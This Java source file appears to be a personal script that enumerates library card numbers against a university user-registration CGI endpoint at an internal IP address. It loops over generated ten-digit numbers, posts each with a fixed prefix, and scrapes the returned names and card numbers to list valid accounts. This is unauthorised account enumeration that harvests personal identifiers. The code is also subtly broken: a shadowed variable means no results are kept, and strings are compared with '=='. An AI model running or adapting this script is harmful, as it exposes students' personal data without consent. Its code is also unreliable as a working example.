package qgb.project.ccsu;

import qgb.T;
import qgb.net.HttpRequest;
import qgb.text.Regex;
import qgb.text.Text;

public class Lib_inum {
	static String sql;
	static String str;
	
	public static void main(String[] args) throws Exception {
		// T.print(T.time());

		for (int i =1; i < 50; i++) {
			for (int j =1; j < 55; j++) {
				for (int j2 = 0; j2 <14; j2++) {
					for (int k = 1; k < 14; k++) {
						get_info(Integer.valueOf("20"
								+Text.format(j2,"00")+ Text.format(k, "00")
								+ Text.format(j+24, "00")+Text.format(i, "00")));
					} 

				}


 			}
		}
		T.print("done!");
		T.write("Lib_inum.txt", str);

	}

	public static void get_info(int ai) {

		String str = HttpRequest.post(
				"http://172.16.32.11/cgi-bin/confirmuser",
				"v_newuser=1&v_regname=&v_cardno=11077" + ai + "&v_passwd=");
		// T.write(ai+".html", str);
		String st_num = "", st_name = "", st_id = "", st_sex = "", st_addr = "", st_zip = "", st_emai = "", st_tele = "", st_offi = "", st_good;
		// System.out.println(sr);
		// T.write("2005.html", sr);
		st_num = Regex
				.get_first_text(
						"(?<=<input type=hidden name=v_cardno value=11077)\\d{10}",
						str);
		st_name = Regex
				.get_first_text(
						"(?<=<input type=hidden name=v_name size=\"20\" value=).{1,20}(?= >)",
						str);
		if (st_name == "" || Integer.valueOf(st_num) != ai) {
			T.print(ai + " empty!" + st_num);
			return;
		}
	
		str=str+st_num+"|";

	}

}
